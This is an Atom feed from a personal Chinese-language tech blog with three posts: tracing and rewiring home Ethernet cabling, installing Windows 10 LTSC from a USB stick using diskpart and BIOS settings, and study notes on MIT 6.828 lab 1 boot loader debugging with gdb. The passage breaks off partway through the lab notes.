<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>here&#39;s ling&#39;s blog</title>
  
  <subtitle>月が绮丽ですね</subtitle>
  <link href="http://ll1ng.github.io/atom.xml" rel="self"/>
  
  <link href="http://ll1ng.github.io/"/>
  <updated>2025-01-27T13:27:38.000Z</updated>
  <id>http://ll1ng.github.io/</id>
  
  <author>
    <name>ling</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次通过壁外调查（雾）实现家庭以太网供网</title>
    <link href="http://ll1ng.github.io/2025/01/27/network-at-home/"/>
    <id>http://ll1ng.github.io/2025/01/27/network-at-home/</id>
    <published>2025-01-27T13:27:38.000Z</published>
    <updated>2025-01-27T13:27:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>起因：或许因为家里路由器用的年岁比较久了，也或许房间离路由器比较远需要穿几面墙，在家上网已经达到了比在学校还差的体验，于是决定插网线上网。然而接好线路后却发现网络不通，咦，这是怎么回事呢？</p><span id="more"></span><p>首先撬开网络面板，就看到网线躺在一边跟我say hi。然后撬开其他面板——所有网线都没接到网络模块上。哦原来是心善的装修师傅知道我以后上组网与运维课不会好好听特意没装，给我留了课后作业让我自己装~</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul><li>所有面板都没有接线</li><li>拆开面板后发现入户光纤口和全屋以太网入口（没查到专有名词，把这个面板打开后是流向全屋的多条网线，设该点为G）在客厅两侧墙上，这意味着用一般思路从路由器或光猫上接线到G的话网线会横穿客厅。（这是装修的时候装错了，一般这两个口不会离得很远）</li></ul><p>目标：实现至少一个屋的有线上网（设这类网口为t）</p><p>本篇只对实践过程进行了记录，理论知识可能不准确。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>一般家庭上网需要经过以下几步：信号由运营商发出，通过光纤口（墙上的一个圆孔）入户后经过光猫（调制解调器）被转换成有线电视信号和宽带信号。一些光猫兼备了路由器的功能可以直接实现无线上网，没有的话需要在光猫上连接无线路由器实现无线上网，或者通过G实现以太网上网。</p><p>而在宿舍用网不需要光猫是因为我们的网口是从上层交换机接出来的，已经经过了调制。</p><p>首先需要确定这些网线能不能通，谁都和谁是一根。</p><h2 id="如何找到墙上网线之间的对应关系"><a href="#如何找到墙上网线之间的对应关系" class="headerlink" title="如何找到墙上网线之间的对应关系"></a>如何找到墙上网线之间的对应关系</h2><p>找一只万用表，打到有二极管图标的挡上，此时示数为0L，接触红黑表笔产生蜂鸣。</p><p>剥开网线皮，解开4对双绞线，并剥开每根铜线使其露出其中的铜质材料。以下提到芯线均指剥出的裸露部分。</p><p>选择一端的其中两根芯线（如橙色和棕色）缠起来。去网线另一端做相同操作，并把相同的两个颜色（橙棕）分别接到万用表的红黑表笔上，如果蜂鸣则说明形成了一条回路，是同一根网线。可以顺便测试一下其他3组回路通不通，任何一条不通后面大概就不用进行了，毕竟墙里的已经改不了了。</p><p>首先把我屋的橙棕连起来，然后去G依次尝试四条线的橙棕，把响的那条标记出来（<strong>一定要标记一定要标记防止后面搞混浪费时间，不要觉得打个结自己就能记住😭</strong>）。依次找到每个屋对应的线。</p><p>经过上述壁外调查后得到我家的网线走向如图：</p><p><img src="https://img.picgo.net/2025/01/29/e997c1b6a21c7732e833bb6e36be11c302808a411a8b9c1c.png" alt="原流向"></p><p>幸运的是，G连出的其中一个屋就是客厅，客厅的网口（设为A）离路由器比较近。于是选择路由器上接出来线连到A，也就是更改原来G流向A的线路为A流向G，AG这条路在总电路中由并联变成了串联，由A经过G给t供网，如图所示。通过这个方案成功避免了网线横跨客厅。</p><p><img src="https://img.picgo.net/2025/01/29/4f64a9871d8bc05edcb10917bdc8fd02ba9f2cc0beb5d336.png" alt="新流向"></p><p>A点将网线卡进网络模块，G点将A的另一端和t的另一端打好水晶头后用一个两头都是网线插座的连接器连接起来。连接好后发现线路还是不通。此时首先考虑是不是线连错了。我家的A有两根网线，其中一根和G相连，另一根不知道通向哪里，就是弄混了这两根导致的。</p><p>此时要测试的是一端打好了水晶头、一端连接好了模块的网线是不是同一根。对于已经打好水晶头的一端，可以剥两根两端裸露的线芯出来，用手把线芯一端压紧在红黑表笔上，另一端插进水晶头的塑料外壳间隙中用上面选两个颜色形成回路的方法测试（用两端都是水晶头的网线亲测可以）。对于连接模块的一侧不确定形成回路的方法，从面板打开弹簧盖能看到有8根铜片但并没有实践过能否通过连接这里形成回路。因为A的另一根网线仍然裸露，连接这根网线产生蜂鸣后就证明是连错了线。通过这种办法能够避免不必要的水晶头/模块重做，毕竟墙外网线长度有限。</p><blockquote><p>此处需要注意，虽然可以用上述办法测试两端都是水晶头的网线是不是一根，但不能保证网线没有问题，只能说是必要不充分条件。在连接过程中发现有一条网线8条路都通但是连上路由器后网卡状态在“认证中”和“已断开”无限切换。最好还是用网络测线仪进行测试。</p></blockquote><p>如果确认没有连错，那么就可能需要重做水晶头/模块。</p><p>接对了线后，t处的电脑终于能上以太网了。但是在Ethernet状态中看到的速度只有10M。可能是由于比起之前的回路，传输距离增加了AG这一段路。在A处加一个交换机（如下图）后看到速度变为了100M（虽然测试感觉视频流畅程度没差不过测速网上看确实涨了不少，但上传速度只有1M（？））。</p><p><img src="https://img.picgo.net/2025/01/29/5684e06f31c51268bb0ed69d8c7acc7eb3b4d221d88273f5.png" alt="优化"></p><h1 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h1><p>考虑到装修验收的时候大概率还没办宽带，可以带个交换机和笔记本。交换机接出来到G，笔记本插其他屋网口，网线闪烁、网卡状态显示identifying大概就没问题（不确定判断条件是否充分）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;起因：或许因为家里路由器用的年岁比较久了，也或许房间离路由器比较远需要穿几面墙，在家上网已经达到了比在学校还差的体验，于是决定插网线上网。然而接好线路后却发现网络不通，咦，这是怎么回事呢？&lt;/p&gt;</summary>
    
    
    
    
    <category term="other" scheme="http://ll1ng.github.io/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>Windows LTSC系统安装</title>
    <link href="http://ll1ng.github.io/2022/10/02/windows-setup/"/>
    <id>http://ll1ng.github.io/2022/10/02/windows-setup/</id>
    <published>2022-10-02T14:06:11.000Z</published>
    <updated>2022-10-02T14:06:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;苦于Windows版本过低无法享受到<code>WSL</code>和<code>windows terminal</code>的便利，近期更新了一波系统，记录如下。</p><span id="more"></span><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;2020年某次更新之后发生了联网失败声卡驱动出问题的情况，搜索无果，为了使用（<del>我用电脑总得上个网听个声儿吧👿</del>）被迫回退到上一个版本。而没过几日Windows又双叒叕逼迫我更新😅终于我再也忍受不了，<del>天下苦Windows自动更新久矣！</del>找到知乎犄角旮旯的一篇文章禁用了某个文件夹后迎来了长达两年半的清静。然而当我想使用WSL、wt等工具时却发现它们所支持的最低版本正好是我当前版本的下一个版本。。</p><blockquote><p>笔记本型号：联想ThinkPad E490</p><p>配置：i5处理器+24G内存</p></blockquote><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;近期<del>忘了从哪儿</del>看到Windows LTSC版本比较精简，省去了很多一般版本自带的功能；同时更新频率也比常见版本低得多。于是决定用用看。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<a href="https://ia904600.us.archive.org/17/items/Windows10EnterpriseLTSC202164Bit/en-us_windows_10_enterprise_ltsc_2021_x64_dvd_d289cf96.iso">iso下载地址 en-us_windows_10_enterprise_ltsc_2021_x64_dvd_d289cf96.iso</a></p><h2 id="方法1-在正常运行的电脑上安装"><a href="#方法1-在正常运行的电脑上安装" class="headerlink" title="方法1.在正常运行的电脑上安装"></a>方法1.在正常运行的电脑上安装</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;双击<code>iso</code>文件挂载，点击<code>setup.exe</code>即可，较为简单。安装完毕后会将原系统文件保存在<code>windows.old</code>文件夹中。</p><h2 id="方法2-从USB启动进行系统的安装"><a href="#方法2-从USB启动进行系统的安装" class="headerlink" title="方法2.从USB启动进行系统的安装"></a>方法2.从USB启动进行系统的安装</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;按理来说像我这种蓝狗已经用上面的方法成功安装后肯定就不会尝试其他方法了，那么为什么尝试了呢？因为装完不知道脑子出了什么问题把原来备份的注册表直接全导进新系统了，还没有拍快照也没有备份新的注册表，哈哈。果然再重启就寄了。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;一开始想，因为是刚安装的系统，能不能在虚拟机里再按同样的步骤装一次然后把注册表替换，但尝试了下失败了不造为啥。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;首先利用<code>iso</code>文件制作U盘。准备一个清空了文件的U盘，打开CMD</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; diskpart</span><br><span class="line">DISKPART&gt; list disk <span class="comment">#找到U盘对应的磁盘号x</span></span><br><span class="line">DISKPART&gt; <span class="built_in">select</span> disk x</span><br><span class="line">DISKPART&gt; clean</span><br><span class="line">DISKPART&gt; create partition primary</span><br><span class="line">DISKPART&gt; active</span><br><span class="line">DISKPART&gt; format fs=ntfs quick</span><br><span class="line">DISKPART&gt; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;之后将<code>iso</code>文件解压到U盘中。插入待安装机器，显示联想图标时按F2进入引导目录。此时发现无法选中使用USB引导，具体表现为选中USB引导按回车后无反应。查阅资料后解决方法如下：</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;进入后按<code>tab</code>键选择<code>setup</code>，切换到<code>restart</code>界面，设置<code>OS Optimized Defaults</code>为<code>Disabled</code>，切换到<code>Load Setup Defaults</code>按下回车选<code>Yes</code>，成功修改<code>UEFI/Legacy Boot Priority</code>为<code>Legacy First</code>使用传统引导方式。过程见<a href="https://www.my607.com/hulianwang/2022-01-16/378616.html">链接</a></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;引导完开始安装，选择要安装的磁盘时遇到如图。我的提示稍有不同：<code>We couldn&#39;t create a new partition or locate an existing one...</code></p><p><img src="https://raw.githubusercontent.com/ll1ng/picture/main/image-20221002230956505.png"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;这里通过<code>Shift+F10</code>尝试查了日志文件<code>X:\Windows\panther</code>路径下文件中的报错<code>the MultiEdition key from the blackboard...</code>可惜并没有什么收获，最终有效的解决方案见<a href="https://answers.microsoft.com/en-us/windows/forum/all/we-couldnt-create-a-new-partition-or-locate-an/acdb1dae-01d9-44f7-846c-433e5addcfc2">链接</a>，格式化了系统盘（注意备份<code>.ssh</code>文件夹，可能还有别的，比如往<code>typora</code>中粘图片时默认保存在C盘）。选择格式化的磁盘时可以通过大小判断哪个是系统盘，不要误删了数据。视频中将USB数据复制到了系统盘中，因而此时安装应当有两种方式，从USB启动或者直接启动。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;安装完毕后发现除了系统盘外没有其他磁盘，运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; diskpart</span><br><span class="line">DISKPART&gt; list volume</span><br><span class="line"></span><br><span class="line">  Disk <span class="comment">###  Status         Size     Free     Dyn  Gpt</span></span><br><span class="line">  <span class="literal">--------</span>  <span class="literal">-------------</span>  <span class="literal">-------</span>  <span class="literal">-------</span>  <span class="literal">---</span>  <span class="literal">---</span></span><br><span class="line">  Disk <span class="number">0</span>    Online          <span class="number">119</span> GB      <span class="number">0</span> B</span><br><span class="line">  Disk <span class="number">1</span>    Foreign         <span class="number">931</span> GB  <span class="number">3072</span> KB   *    *</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;按下<code>win+R</code>，输入<code>diskmgmt.msc</code>，回车，找到状态显示为<code>Foreign</code>的磁盘，右键<code>import Foreign Disks</code>即可。</p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><ul><li><a href="https://codeload.github.com/kkkgo/LTSB-Add-MicrosoftStore/zip/refs/tags/2016">安装应用商店</a></li><li>在进行<code>TIM</code>聊天记录的迁移时还遇到无法迁移的问题，<a href="https://zhuanlan.zhihu.com/p/389883485">解决方案</a></li><li><code>chrome</code>历史记录位于<code>C:\Users\user_name\AppData\Local\Google\Chrome\User Data\Default</code>，备份后替换新的<code>history</code>文件即可。</li><li>至今未经历过重大更新，都是一些不太耗时的更新（几分钟内）比较欣慰的是从前永远等不到头的“正在准备您的计算机请不要关机”终于可以等到头了（ 👉经历了，放弃了，改注册表10000年后再提醒我更新</li><li>宝，答应我，不要修改并保存打开时显示是乱码的txt文件好吗？</li><li>设置-&gt;屏幕-&gt;缩放与布局中最小是100%而不再是75%了，这意味着没办法用家里1440*900的显示器看更多内容了，悲（不确定之前用的是不是75%，但只能想到这个原因）</li><li>ps pr使用正常</li><li>待续</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.ujiaoshou.com/upanjc/jiaocheng/24257.html">USB格式化</a></p><p><a href="https://copyfuture.com/blogs-details/20210706161552989k">用于引导的USB制作1</a> <a href="https://wenku.baidu.com/view/943040aa6629647d27284b73f242336c1eb9300d.html">2</a></p><p><a href="https://www.my607.com/hulianwang/2022-01-16/378616.html">联想电脑无法USB引导</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;ensp;苦于Windows版本过低无法享受到&lt;code&gt;WSL&lt;/code&gt;和&lt;code&gt;windows terminal&lt;/code&gt;的便利，近期更新了一波系统，记录如下。&lt;/p&gt;</summary>
    
    
    
    
    <category term="环境" scheme="http://ll1ng.github.io/tags/%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.828-lab1</title>
    <link href="http://ll1ng.github.io/2022/05/06/MIT6-828-lab1/"/>
    <id>http://ll1ng.github.io/2022/05/06/MIT6-828-lab1/</id>
    <published>2022-05-06T15:21:28.000Z</published>
    <updated>2022-05-06T15:21:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;蕾姆，终于小小地填了点坑</p><span id="more"></span><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;这课B站上没找到很合适的视频，就直接跟着<a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/">文档</a>走了。这篇记一下自己不熟悉的知识点和没搞懂的地方。</p><h1 id="Part-1-PC-Bootstrap"><a href="#Part-1-PC-Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;汇编器<code>NASM</code>使用的是<code>intel</code>语法，<code>GNU</code>使用的是<code>AT&amp;T</code>语法。本实验使用<code>GNU</code>。</p><h2 id="The-PC’s-Physical-Address-Space"><a href="#The-PC’s-Physical-Address-Space" class="headerlink" title="The PC’s Physical Address Space"></a>The PC’s Physical Address Space</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB)</span><br><span class="line">|      32-bit      |</span><br><span class="line">|  memory mapped   |</span><br><span class="line">|     devices      |</span><br><span class="line">|                  |</span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line"></span><br><span class="line">/\/\/\/\/\/\/\/\/\/\</span><br><span class="line">|                  |</span><br><span class="line">|      Unused      |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- depends on amount of RAM</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">| Extended Memory  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB)</span><br><span class="line">|     BIOS ROM     |</span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB)</span><br><span class="line">|  16-bit devices, |</span><br><span class="line">|  expansion ROMs  |</span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB)</span><br><span class="line">|   VGA Display    |</span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB)</span><br><span class="line">|                  |</span><br><span class="line">|    Low Memory    |</span><br><span class="line">|                  |</span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>BIOS</code>一开始存放在真正的只读存储器中，现在则存放在可刷新的闪存中。<code>BIOS</code>用来实现基本的系统初始化，如激活显卡、检查安装的内存。初始化完成后，<code>BIOS</code>从正确的设备（如软盘、硬盘、CD-ROM或网络）中加载操作系统，并将执行权限交给操作系统。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>IBM PC</code>从物理地址<code>0x000ffff0</code>开始执行，这是<code>BIOS区</code>相当高的一个地址，此处存放了一条指令：<code>ljmp   $0xf000,$0xe05b</code>，设置了<code>CS IP</code>。这样设计的目的是使<code>BIOS</code>永远在开机或重启后先得到机器的控制权（啊？）。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;当<code>BIOS</code>运行时，建立一个中断描述符表，初始化如<code>VGA display</code>（视频图形阵列 显示？）在内的不同的设备。这就是<code>QEMU</code>窗口中可以看到字符的原因。当初始化完<code>PCI bus</code>和所有<code>BIOS</code>知道的重要设备后，它找到一个可引导的设备如软盘、硬盘、CD-ROM。找到后<code>BIOS</code>将<code>boot loader</code>从硬盘中读出，并将控制权交给它。</p><h1 id="Part2-The-Boot-Loader"><a href="#Part2-The-Boot-Loader" class="headerlink" title="Part2: The Boot Loader"></a>Part2: The Boot Loader</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;如果一个硬盘是可引导的，那么称它的第一个扇区为引导扇区，也就是<code>boot loader</code>所在的位置。当<code>BIOS</code>找到一个可引导设备时，它将这个引导扇区加载入物理地址为<code>0x7c00~0x7dff</code>的内存中，然后用<code>jmp</code>设置<code>CS IP</code>，将控制权交给<code>boot loader</code>。<code>BIOS</code>加载地址是相对任意的（？），而对PC来说这些地址是固定且标准化的。从CD-ROM中引导的能力是在PC开始发展很久以后才出现的，CD-ROM扇区大小为2048，能加载大得多的引导镜像。本实验使用的是传统硬件驱动引导机制。<code>boot loader</code>包括一个汇编语言源文件<code>boot/boot.S</code>和一个C源文件<code>boot/main.c</code>。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>boot loader</code>的功能应包括：</p><ul><li>将处理器从实模式转换到32位保护模式，因为只有在这种模式下才能访问1MB空间的内存。</li><li>从硬盘里读取内核来通过x86特殊的IO指令直接访问IDE硬盘设备（啥？）寄存器。</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>obj/kern/kernel.asm</code>文件是<code>JOS kernel</code>的反汇编文件。</p><p><strong>Exercise 3.</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;在0x7c00处下断点，执行到此处后对照<code>boot/boot.S</code>和 <code>obj/boot/boot.asm</code> 调试。回答以下问题。</p><ul><li>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;（这个不知道问的是保护模式还是32位模式就行）第一次跟的时候没在0x7c00处下断点，从头跟到这句以为就进了。可以看到此时地址是<code>0xfd781</code>故还在<code>BIOS</code>中，而这里我们学习的是<code>boot loader</code>所以应该不是这儿233。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[f000:d187]    0xfd187:ljmpl  <span class="variable">$0x8</span>,<span class="variable">$0xfd18f</span></span><br><span class="line">0x0000d187 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) </span><br><span class="line">The target architecture is assumed to be i386</span><br><span class="line">=&gt; 0xfd18f:mov    <span class="variable">$0x10</span>,%eax</span><br><span class="line">0x000fd18f <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;下方是想提问的地方。程序加载全局描述符表，取<code>cr0</code>原始值，将值最后一位置1，赋给<code>cr0</code>，最后<code>ljmp   $PROT_MODE_CSEG, $protcseg</code>跳转到32位代码段，程序进入保护模式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c1e] =&gt; 0x7c1e:lgdtw  0x7c64</span><br><span class="line">0x00007c1e <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) </span><br><span class="line">[   0:7c23] =&gt; 0x7c23:mov    %cr0,%eax</span><br><span class="line">0x00007c23 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) </span><br><span class="line">[   0:7c26] =&gt; 0x7c26:or     <span class="variable">$0x1</span>,%eax</span><br><span class="line">0x00007c26 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) p/x <span class="variable">$cr0</span></span><br><span class="line"><span class="variable">$1</span> = 0x0</span><br><span class="line">(gdb) si</span><br><span class="line">[   0:7c2a] =&gt; 0x7c2a:mov    %eax,%cr0</span><br><span class="line">0x00007c2a <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) </span><br><span class="line">[   0:7c2d] =&gt; 0x7c2d:ljmp   <span class="variable">$0x8</span>,<span class="variable">$0x7c32</span></span><br><span class="line">0x00007c2d <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) si</span><br><span class="line">The target architecture is assumed to be i386</span><br><span class="line">=&gt; 0x7c32:mov    <span class="variable">$0x10</span>,%ax</span><br><span class="line">0x00007c32 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure><blockquote><p><code>lgdt</code>指令在实模式保护模式下都可以执行</p><p><code>CR0</code>是处理器内部的控制寄存器，包含了用于控制处理器操作模式和运行状态的标志位。32位，第1位是保护模式允许位PE</p></blockquote><ul><li>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded?</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;对比<code>main.c</code>和自<code>0x7c00</code>起始的反汇编指令，得到最后一条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7d7f:jmp    0x7d66</span><br><span class="line">0x7d81:call   *0x10018      &lt;---</span><br><span class="line">;((void (*)(void)) (ELFHDR-&gt;e_entry))();</span><br><span class="line">0x7d87:mov    $0x8a00,%edx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Continuing.</span><br><span class="line">=&gt; 0x7d81:call   *0x10018</span><br><span class="line">Breakpoint 4, 0x00007d81 in ?? ()</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0x10000c:movw   $0x1234,0x472  &lt;--kernel第一条指令</span><br><span class="line">0x0010000c in ?? ()</span><br></pre></td></tr></table></figure><ul><li>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>bootmain</code>首先从磁盘上读取8个扇区大小的数据载入<code>0x10000</code>处，检测到载入的是一个合法的ELF文件后，取ELF结构体成员段表偏移<code>ELFHDR-&gt;e_phoff</code>+文件起始地址为第一个段表所在位置，段表个数由成员<code>e_phnum</code>得知。遍历每一个段表，根据段表结构体<code>Proghdr</code>成员<code>p_offset</code>,<code>p_memsz</code>,<code>p_pa</code>将每个段载入各自对应的位置。这里猜测不直接将所有段一起载入是为了节约空间。</p><h2 id="Loading-the-Kernel"><a href="#Loading-the-Kernel" class="headerlink" title="Loading the Kernel"></a>Loading the Kernel</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>VMA</code>和<code>LMA</code>。<code>VMA</code>，或虚拟地址，运行时才会有；<code>LMA</code>，或加载地址，加载时使用。链接器对二进制文件中的链接地址进行不同的处理，如当程序需要一个全局变量的地址时，如果是从未经链接的地址开始执行，二进制文件就不能正常工作。（不需要就可以正常执行？这句话属实不懂，链接地址又是个啥）生成这种不引用任何绝对地址的位置无关代码的技术已存在，且为现代共享库广泛使用，但它存在性能和复杂性上的开销，所以本实验中不用。也就是说，在本实验中段的<code>VMA</code>和<code>LMA</code>相同。</p><blockquote><p><strong>链接</strong>：将各种代码和数据片段收集并组合成一个单一文件的过程，这个文件可被加载到内存并执行。链接可以执行与编译时（源代码-&gt;机器代码）、加载时（程序被加载器<code>loader</code>加载到内存并执行时）、甚至运行时（由应用程序执行）。</p><p><strong>加载</strong>：将磁盘中的指令和数据载入内存中并运行的过程。</p><p><a href="https://sourceware.org/binutils/docs/ld/Basic-Script-Concepts.html#Basic-Script-Concepts">linker文档</a>中提到，大部分时候两个地址都是相同的，一种二者可能不同的例子是数据段被加载到ROM中，当程序启动时又被复制到RAM中（这种技术常被用来在基于ROM的系统中初始化全局变量）</p><p>PS1：原文档翻译过来是<code>VMA</code>，或链接地址，加载到内存中的地址；<code>LMA</code>，或加载地址，这个段应该被载入内存中的地址。我就想问问<code>VMA LMA</code>这俩描述有啥区别？？</p><p>PS2：为避免“链接”的概念混淆，上述链接替换为虚拟，特指运行时地址。</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;<code>ELF</code>对象中需要被加载入内存的部分被标记为<code>LOAD</code>，<code>ph-&gt;p_pa</code>字段是段的物理地址</p><p><strong>Exercise 5</strong> 通过给 <code>boot/Makefrag</code>中的链接器传递 <code>-Ttext 0x7C00</code>来设置链接地址，这样程序才能正常执行。现改变<code>0x7c00</code>看程序如何崩溃。</p><p>【原因不会讲】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[   0:7c2d] =&gt; 0x7c2d:ljmp   $0x8,$0x6c32</span><br></pre></td></tr></table></figure><blockquote><p><code>e_entry</code>存放了程序入口点的链接地址</p></blockquote><p><strong>Exercise 6</strong> 在<code>BIOS</code>进入<code>boot loader</code>时和<code>boot loader</code>进入<code>kernel</code>时观察内存<code>0x100000</code>处8字节的值，为什么它们不同？第二次观察时加载的是什么？</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;在进入<code>boot loader</code>时为0，进入kernel时:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/8wx 0x100000</span><br><span class="line">0x100000:0x1badb0020x000000000xe4524ffe0x7205c766</span><br><span class="line">0x100010:0x340000040x2000b8120x220f00110xc0200fd8</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;在从<code>boot loader</code>进入<code>kernel</code>时加载了<code>kernel</code>的第一页。前三个字段的含义可从<a href="https://www.gnu.org/software/grub/manual/multiboot/html_node/Header-magic-fields.html">这里</a>查阅到，所有的<code>OS image</code>文件都会有这个文件头。</p><h1 id="Part3-The-Kernel"><a href="#Part3-The-Kernel" class="headerlink" title="Part3: The Kernel"></a>Part3: The Kernel</h1><h2 id="Using-virtual-memory-to-work-around-position-dependence"><a href="#Using-virtual-memory-to-work-around-position-dependence" class="headerlink" title="Using virtual memory to work around position dependence"></a>Using virtual memory to work around position dependence</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;由<code>objdump -h</code>输出结果得知<code>boot 